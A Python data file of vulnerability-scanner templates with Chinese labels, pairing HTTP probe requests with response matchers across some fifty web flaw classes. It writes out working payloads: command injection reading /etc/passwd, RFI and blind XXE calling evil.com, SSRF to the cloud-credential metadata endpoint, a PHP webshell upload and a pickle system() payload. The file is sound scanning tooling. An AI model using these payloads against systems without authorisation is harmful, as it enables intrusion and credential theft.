"""
扩展漏洞模板库
从14个扩展到50+模板
覆盖：SQL注入/XSS/命令执行/路径遍历/SSRF/XXE/文件上传/认证绕过/信息泄露/业务逻辑/SSTI/反序列化/原型污染等
"""

EXTENDED_TEMPLATES = [
    # ========== SQL注入扩展 ==========
    {
        "id": "sqli-blind-boolean",
        "name": "SQL盲注（布尔型）",
        "severity": "high",
        "category": "SQL注入",
        "description": "通过布尔条件判断检测盲注漏洞",
        "requests": [
            {
                "method": "GET",
                "path": "/?id=1 AND 1=1",
                "matchers": [{"type": "status", "status": [200]}]
            },
            {
                "method": "GET",
                "path": "/?id=1 AND 1=2",
                "matchers": [{"type": "status", "status": [500, 200]}]
            }
        ]
    },
    {
        "id": "sqli-blind-time",
        "name": "SQL盲注（时间型）",
        "severity": "high",
        "category": "SQL注入",
        "description": "通过时间延迟检测时间盲注漏洞",
        "requests": [
            {
                "method": "GET",
                "path": "/?id=1; WAITFOR DELAY '0:0:3'--",
                "matchers": [{"type": "time", "min_seconds": 3}]
            },
            {
                "method": "GET",
                "path": "/?id=1 AND SLEEP(3)--",
                "matchers": [{"type": "time", "min_seconds": 3}]
            }
        ]
    },
    {
        "id": "sqli-stacked-query",
        "name": "SQL堆叠查询注入",
        "severity": "critical",
        "category": "SQL注入",
        "description": "检测堆叠查询注入（可执行多条SQL语句）",
        "requests": [
            {
                "method": "GET",
                "path": "/?id=1; SELECT 1--",
                "matchers": [{"type": "status", "status": [200, 500]}]
            }
        ]
    },
    {
        "id": "sqli-header-injection",
        "name": "HTTP头SQL注入",
        "severity": "high",
        "category": "SQL注入",
        "description": "检测User-Agent/X-Forwarded-For等HTTP头的SQL注入",
        "requests": [
            {
                "method": "GET",
                "path": "/",
                "headers": {"User-Agent": "Mozilla/5.0' OR '1'='1"},
                "matchers": [{"type": "status", "status": [200, 500]}]
            },
            {
                "method": "GET",
                "path": "/",
                "headers": {"X-Forwarded-For": "127.0.0.1' OR '1'='1"},
                "matchers": [{"type": "status", "status": [200, 500]}]
            }
        ]
    },

    # ========== XSS扩展 ==========
    {
        "id": "xss-stored",
        "name": "存储型XSS",
        "severity": "high",
        "category": "XSS",
        "description": "检测存储型跨站脚本攻击（评论/留言/用户名等）",
        "requests": [
            {
                "method": "POST",
                "path": "/comment",
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "content=<script>alert('XSS')</script>",
                "matchers": [{"type": "status", "status": [200, 302]}]
            },
            {
                "method": "GET",
                "path": "/comments",
                "matchers": [{"type": "word", "words": ["<script>alert('XSS')</script>"], "condition": "or"}]
            }
        ]
    },
    {
        "id": "xss-svg",
        "name": "SVG XSS",
        "severity": "medium",
        "category": "XSS",
        "description": "检测SVG文件中的XSS漏洞",
        "requests": [
            {
                "method": "GET",
                "path": "/?q=<svg/onload=alert(1)>",
                "matchers": [{"type": "word", "words": ["<svg/onload=alert(1)>"], "condition": "or"}]
            }
        ]
    },
    {
        "id": "xss-attribute-injection",
        "name": "属性注入XSS",
        "severity": "medium",
        "category": "XSS",
        "description": "检测HTML属性注入导致的XSS",
        "requests": [
            {
                "method": "GET",
                "path": "/?name=\" onmouseover=alert(1) x=\"",
                "matchers": [{"type": "word", "words": ["onmouseover=alert(1)"], "condition": "or"}]
            }
        ]
    },
    {
        "id": "xss-javascript-uri",
        "name": "JavaScript URI XSS",
        "severity": "medium",
        "category": "XSS",
        "description": "检测javascript: URI协议XSS",
        "requests": [
            {
                "method": "GET",
                "path": "/?url=javascript:alert(1)",
                "matchers": [{"type": "word", "words": ["javascript:alert(1)"], "condition": "or"}]
            }
        ]
    },

    # ========== 命令执行扩展 ==========
    {
        "id": "command-injection-linux",
        "name": "Linux命令注入",
        "severity": "critical",
        "category": "命令执行",
        "description": "检测Linux系统命令注入（多种分隔符）",
        "requests": [
            {
                "method": "GET",
                "path": "/?ip=127.0.0.1;cat /etc/passwd",
                "matchers": [{"type": "word", "words": ["root:x:", "bin:x:"], "condition": "or"}]
            },
            {
                "method": "GET",
                "path": "/?ip=127.0.0.1|id",
                "matchers": [{"type": "word", "words": ["uid=", "gid="], "condition": "or"}]
            },
            {
                "method": "GET",
                "path": "/?ip=127.0.0.1`id`",
                "matchers": [{"type": "word", "words": ["uid=", "gid="], "condition": "or"}]
            },
            {
                "method": "GET",
                "path": "/?ip=127.0.0.1$(id)",
                "matchers": [{"type": "word", "words": ["uid=", "gid="], "condition": "or"}]
            }
        ]
    },
    {
        "id": "command-injection-windows",
        "name": "Windows命令注入",
        "severity": "critical",
        "category": "命令执行",
        "description": "检测Windows系统命令注入",
        "requests": [
            {
                "method": "GET",
                "path": "/?ip=127.0.0.1&whoami",
                "matchers": [{"type": "word", "words": ["administrator", "system", "desktop"], "condition": "or"}]
            },
            {
                "method": "GET",
                "path": "/?ip=127.0.0.1|ipconfig",
                "matchers": [{"type": "word", "words": ["Windows IP", "IPv4"], "condition": "or"}]
            }
        ]
    },
    {
        "id": "code-injection-php",
        "name": "PHP代码注入",
        "severity": "critical",
        "category": "代码执行",
        "description": "检测PHP代码注入/远程代码执行",
        "requests": [
            {
                "method": "GET",
                "path": "/?page=phpinfo()",
                "matchers": [{"type": "word", "words": ["phpinfo()", "PHP Version", "php.ini"], "condition": "or"}]
            },
            {
                "method": "GET",
                "path": "/?cmd=system('id')",
                "matchers": [{"type": "word", "words": ["uid=", "gid="], "condition": "or"}]
            }
        ]
    },

    # ========== 路径遍历扩展 ==========
    {
        "id": "path-traversal-encoded",
        "name": "路径遍历（编码绕过）",
        "severity": "high",
        "category": "路径遍历",
        "description": "检测编码绕过的路径遍历漏洞",
        "requests": [
            {
                "method": "GET",
                "path": "/?file=..%2f..%2f..%2fetc%2fpasswd",
                "matchers": [{"type": "word", "words": ["root:x:", "bin:x:"], "condition": "or"}]
            },
            {
                "method": "GET",
                "path": "/?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "matchers": [{"type": "word", "words": ["root:x:", "bin:x:"], "condition": "or"}]
            },
            {
                "method": "GET",
                "path": "/?file=....//....//etc/passwd",
                "matchers": [{"type": "word", "words": ["root:x:", "bin:x:"], "condition": "or"}]
            }
        ]
    },
    {
        "id": "file-inclusion-lfi",
        "name": "本地文件包含（LFI）",
        "severity": "high",
        "category": "文件包含",
        "description": "检测本地文件包含漏洞",
        "requests": [
            {
                "method": "GET",
                "path": "/?page=/etc/passwd",
                "matchers": [{"type": "word", "words": ["root:x:", "bin:x:"], "condition": "or"}]
            },
            {
                "method": "GET",
                "path": "/?template=../../../../etc/passwd",
                "matchers": [{"type": "word", "words": ["root:x:", "bin:x:"], "condition": "or"}]
            }
        ]
    },
    {
        "id": "file-inclusion-rfi",
        "name": "远程文件包含（RFI）",
        "severity": "critical",
        "category": "文件包含",
        "description": "检测远程文件包含漏洞",
        "requests": [
            {
                "method": "GET",
                "path": "/?page=http://evil.com/shell.php",
                "matchers": [{"type": "status", "status": [200]}]
            }
        ]
    },

    # ========== SSRF扩展 ==========
    {
        "id": "ssrf-cloud-metadata",
        "name": "SSRF云元数据泄露",
        "severity": "critical",
        "category": "SSRF",
        "description": "检测SSRF访问云服务元数据（AWS/Azure/GCP）",
        "requests": [
            {
                "method": "GET",
                "path": "/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "matchers": [{"type": "word", "words": ["AccessKeyId", "SecretAccessKey", "Token"], "condition": "or"}]
            },
            {
                "method": "GET",
                "path": "/?url=http://169.254.169.254/metadata/v1/",
                "matchers": [{"type": "word", "words": ["hostname", "interfaces", "region"], "condition": "or"}]
            }
        ]
    },
    {
        "id": "ssrf-internal-scan",
        "name": "SSRF内网端口扫描",
        "severity": "high",
        "category": "SSRF",
        "description": "检测SSRF内网端口扫描",
        "requests": [
            {
                "method": "GET",
                "path": "/?url=http://127.0.0.1:6379",
                "matchers": [{"type": "word", "words": ["Redis", "+PONG", "-ERR"], "condition": "or"}]
            },
            {
                "method": "GET",
                "path": "/?url=http://127.0.0.1:27017",
                "matchers": [{"type": "word", "words": ["MongoDB", "It looks like you are trying"], "condition": "or"}]
            }
        ]
    },

    # ========== XXE扩展 ==========
    {
        "id": "xxe-blind",
        "name": "Blind XXE",
        "severity": "high",
        "category": "XXE",
        "description": "检测Blind XXE漏洞（OOB外带）",
        "requests": [
            {
                "method": "POST",
                "path": "/",
                "headers": {"Content-Type": "application/xml"},
                "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/xxe\">]><foo>&xxe;</foo>",
                "matchers": [{"type": "status", "status": [200, 500]}]
            }
        ]
    },
    {
        "id": "xxe-parameter-entity",
        "name": "XXE参数实体注入",
        "severity": "high",
        "category": "XXE",
        "description": "检测参数实体XXE注入",
        "requests": [
            {
                "method": "POST",
                "path": "/",
                "headers": {"Content-Type": "application/xml"},
                "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">%xxe;]><foo>test</foo>",
                "matchers": [{"type": "word", "words": ["root:x:", "bin:x:"], "condition": "or"}]
            }
        ]
    },

    # ========== 文件上传扩展 ==========
    {
        "id": "file-upload-webshell",
        "name": "文件上传Webshell",
        "severity": "critical",
        "category": "文件上传",
        "description": "检测文件上传漏洞（可上传webshell）",
        "requests": [
            {
                "method": "POST",
                "path": "/upload",
                "headers": {"Content-Type": "multipart/form-data"},
                "body": "<?php system($_GET['cmd']); ?>",
                "matchers": [{"type": "status", "status": [200]}]
            }
        ]
    },
    {
        "id": "file-upload-double-extension",
        "name": "文件上传双扩展名绕过",
        "severity": "high",
        "category": "文件上传",
        "description": "检测双扩展名文件上传绕过",
        "requests": [
            {
                "method": "POST",
                "path": "/upload",
                "headers": {"Content-Type": "multipart/form-data"},
                "body": "shell.php.jpg",
                "matchers": [{"type": "status", "status": [200]}]
            }
        ]
    },

    # ========== 认证绕过扩展 ==========
    {
        "id": "jwt-none-algorithm",
        "name": "JWT算法混淆（none）",
        "severity": "high",
        "category": "认证",
        "description": "检测JWT算法混淆漏洞（alg: none）",
        "requests": [
            {
                "method": "GET",
                "path": "/api/user",
                "headers": {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."},
                "matchers": [{"type": "status", "status": [200]}]
            }
        ]
    },
    {
        "id": "session-fixation",
        "name": "会话固定攻击",
        "severity": "medium",
        "category": "认证",
        "description": "检测会话固定漏洞（登录后session不变）",
        "requests": [
            {
                "method": "GET",
                "path": "/login",
                "matchers": [{"type": "header", "header": "Set-Cookie", "value": "PHPSESSID"}]
            }
        ]
    },
    {
        "id": "brute-force-login",
        "name": "登录暴力破解",
        "severity": "high",
        "category": "认证",
        "description": "检测登录接口是否存在暴力破解风险（无速率限制）",
        "requests": [
            {
                "method": "POST",
                "path": "/login",
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "username=admin&password=wrongpassword123",
                "matchers": [{"type": "status", "status": [200, 401]}]
            }
        ]
    },

    # ========== 信息泄露扩展 ==========
    {
        "id": "git-repository-exposed",
        "name": "Git仓库泄露",
        "severity": "high",
        "category": "信息泄露",
        "description": "检测.git目录是否可直接访问",
        "requests": [
            {
                "method": "GET",
                "path": "/.git/HEAD",
                "matchers": [{"type": "word", "words": ["ref: refs/heads/", "ref: refs/"], "condition": "or"}]
            },
            {
                "method": "GET",
                "path": "/.git/config",
                "matchers": [{"type": "word", "words": ["[core]", "[remote"], "condition": "or"}]
            }
        ]
    },
    {
        "id": "env-file-exposed",
        "name": "环境变量文件泄露",
        "severity": "critical",
        "category": "信息泄露",
        "description": "检测.env文件是否可直接访问",
        "requests": [
            {
                "method": "GET",
                "path": "/.env",
                "matchers": [{"type": "word", "words": ["DB_PASSWORD", "API_KEY", "SECRET_KEY", "APP_KEY", "DATABASE_URL"], "condition": "or"}]
            },
            {
                "method": "GET",
                "path": "/.env.local",
                "matchers": [{"type": "word", "words": ["DB_PASSWORD", "API_KEY", "SECRET_KEY"], "condition": "or"}]
            }
        ]
    },
    {
        "id": "backup-file-exposed",
        "name": "备份文件泄露",
        "severity": "high",
        "category": "信息泄露",
        "description": "检测备份文件是否可直接访问",
        "requests": [
            {"method": "GET", "path": "/backup.zip", "matchers": [{"type": "status", "status": [200]}]},
            {"method": "GET", "path": "/backup.tar.gz", "matchers": [{"type": "status", "status": [200]}]},
            {"method": "GET", "path": "/www.zip", "matchers": [{"type": "status", "status": [200]}]},
            {"method": "GET", "path": "/web.zip", "matchers": [{"type": "status", "status": [200]}]},
            {"method": "GET", "path": "/database.sql", "matchers": [{"type": "word", "words": ["CREATE TABLE", "INSERT INTO"], "condition": "or"}]},
            {"method": "GET", "path": "/dump.sql", "matchers": [{"type": "word", "words": ["CREATE TABLE", "INSERT INTO"], "condition": "or"}]}
        ]
    },
    {
        "id": "debug-mode-enabled",
        "name": "调试模式开启",
        "severity": "medium",
        "category": "信息泄露",
        "description": "检测应用是否开启调试模式（泄露敏感信息）",
        "requests": [
            {
                "method": "GET",
                "path": "/?debug=1",
                "matchers": [{"type": "word", "words": ["Debug", "debug mode", "stack trace", "Traceback"], "condition": "or"}]
            },
            {
                "method": "GET",
                "path": "/_debug",
                "matchers": [{"type": "status", "status": [200]}]
            }
        ]
    },
    {
        "id": "directory-listing",
        "name": "目录列表泄露",
        "severity": "medium",
        "category": "信息泄露",
        "description": "检测目录列表是否开启",
        "requests": [
            {
                "method": "GET",
                "path": "/uploads/",
                "matchers": [{"type": "word", "words": ["Index of", "Directory listing", "Parent Directory"], "condition": "or"}]
            },
            {
                "method": "GET",
                "path": "/backup/",
                "matchers": [{"type": "word", "words": ["Index of", "Directory listing"], "condition": "or"}]
            }
        ]
    },

    # ========== 业务逻辑漏洞 ==========
    {
        "id": "idor-horizontal",
        "name": "水平越权（IDOR）",
        "severity": "high",
        "category": "业务逻辑",
        "description": "检测水平越权漏洞（可访问其他用户数据）",
        "requests": [
            {
                "method": "GET",
                "path": "/api/users/1",
                "matchers": [{"type": "status", "status": [200]}]
            },
            {
                "method": "GET",
                "path": "/api/orders/1",
                "matchers": [{"type": "status", "status": [200]}]
            }
        ]
    },
    {
        "id": "mass-assignment",
        "name": "批量赋值漏洞",
        "severity": "high",
        "category": "业务逻辑",
        "description": "检测批量赋值漏洞（可修改敏感字段）",
        "requests": [
            {
                "method": "PUT",
                "path": "/api/user/profile",
                "headers": {"Content-Type": "application/json"},
                "body": "{\"role\": \"admin\", \"is_admin\": true}",
                "matchers": [{"type": "status", "status": [200]}]
            }
        ]
    },
    {
        "id": "race-condition",
        "name": "竞态条件漏洞",
        "severity": "high",
        "category": "业务逻辑",
        "description": "检测竞态条件漏洞（优惠券/积分/余额重复使用）",
        "requests": [
            {
                "method": "POST",
                "path": "/api/coupon/redeem",
                "headers": {"Content-Type": "application/json"},
                "body": "{\"coupon_code\": \"TEST123\"}",
                "matchers": [{"type": "status", "status": [200]}]
            }
        ]
    },

    # ========== SSTI模板注入 ==========
    {
        "id": "ssti-jinja2",
        "name": "SSTI模板注入（Jinja2）",
        "severity": "critical",
        "category": "模板注入",
        "description": "检测Jinja2模板注入漏洞（Python）",
        "requests": [
            {
                "method": "GET",
                "path": "/?name={{7*7}}",
                "matchers": [{"type": "word", "words": ["49"], "condition": "or"}]
            },
            {
                "method": "GET",
                "path": "/?name={{config}}",
                "matchers": [{"type": "word", "words": ["Config", "SECRET_KEY", "DEBUG"], "condition": "or"}]
            }
        ]
    },
    {
        "id": "ssti-freemarker",
        "name": "SSTI模板注入（Freemarker）",
        "severity": "critical",
        "category": "模板注入",
        "description": "检测Freemarker模板注入漏洞（Java）",
        "requests": [
            {
                "method": "GET",
                "path": "/?name=${7*7}",
                "matchers": [{"type": "word", "words": ["49"], "condition": "or"}]
            }
        ]
    },

    # ========== 反序列化 ==========
    {
        "id": "deserialization-python",
        "name": "Python反序列化漏洞",
        "severity": "critical",
        "category": "反序列化",
        "description": "检测Python pickle反序列化漏洞",
        "requests": [
            {
                "method": "POST",
                "path": "/",
                "headers": {"Content-Type": "application/octet-stream"},
                "body": "cos\nsystem\n(S'id'\ntR.",
                "matchers": [{"type": "status", "status": [200, 500]}]
            }
        ]
    },
    {
        "id": "deserialization-java",
        "name": "Java反序列化漏洞",
        "severity": "critical",
        "category": "反序列化",
        "description": "检测Java反序列化漏洞（CommonsCollections等）",
        "requests": [
            {
                "method": "POST",
                "path": "/",
                "headers": {"Content-Type": "application/x-java-serialized-object"},
                "body": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvcgA",
                "matchers": [{"type": "status", "status": [200, 500]}]
            }
        ]
    },

    # ========== 原型污染 ==========
    {
        "id": "prototype-pollution",
        "name": "原型污染（Node.js）",
        "severity": "high",
        "category": "原型污染",
        "description": "检测JavaScript原型污染漏洞",
        "requests": [
            {
                "method": "POST",
                "path": "/",
                "headers": {"Content-Type": "application/json"},
                "body": "{\"__proto__\": {\"polluted\": \"yes\"}}",
                "matchers": [{"type": "status", "status": [200]}]
            }
        ]
    },

    # ========== CORS/安全头扩展 ==========
    {
        "id": "cors-wildcard-credentials",
        "name": "CORS通配符+凭证",
        "severity": "high",
        "category": "CORS",
        "description": "检测CORS配置错误（通配符Origin+Allow-Credentials）",
        "requests": [
            {
                "method": "GET",
                "path": "/",
                "headers": {"Origin": "https://evil.com"},
                "matchers": [
                    {"type": "header", "header": "Access-Control-Allow-Origin", "value": "*"},
                    {"type": "header", "header": "Access-Control-Allow-Credentials", "value": "true"}
                ],
                "condition": "and"
            }
        ]
    },
    {
        "id": "hsts-missing",
        "name": "HSTS缺失",
        "severity": "low",
        "category": "安全头",
        "description": "检测HTTP严格传输安全头缺失",
        "requests": [
            {
                "method": "GET",
                "path": "/",
                "matchers": [{"type": "no-header", "header": "strict-transport-security"}]
            }
        ]
    },
    {
        "id": "csp-missing",
        "name": "CSP缺失",
        "severity": "low",
        "category": "安全头",
        "description": "检测内容安全策略头缺失",
        "requests": [
            {
                "method": "GET",
                "path": "/",
                "matchers": [{"type": "no-header", "header": "content-security-policy"}]
            }
        ]
    },

    # ========== 其他 ==========
    {
        "id": "http-method-trace",
        "name": "HTTP TRACE方法开启",
        "severity": "low",
        "category": "配置错误",
        "description": "检测HTTP TRACE方法是否开启（XST攻击）",
        "requests": [
            {
                "method": "TRACE",
                "path": "/",
                "matchers": [{"type": "status", "status": [200]}]
            }
        ]
    },
    {
        "id": "server-version-disclosure",
        "name": "服务器版本泄露",
        "severity": "info",
        "category": "信息泄露",
        "description": "检测服务器版本信息泄露",
        "requests": [
            {
                "method": "GET",
                "path": "/",
                "matchers": [
                    {"type": "header", "header": "Server", "value": "Apache"},
                    {"type": "header", "header": "Server", "value": "nginx"},
                    {"type": "header", "header": "X-Powered-By", "value": "PHP"}
                ],
                "condition": "or"
            }
        ]
    }
]
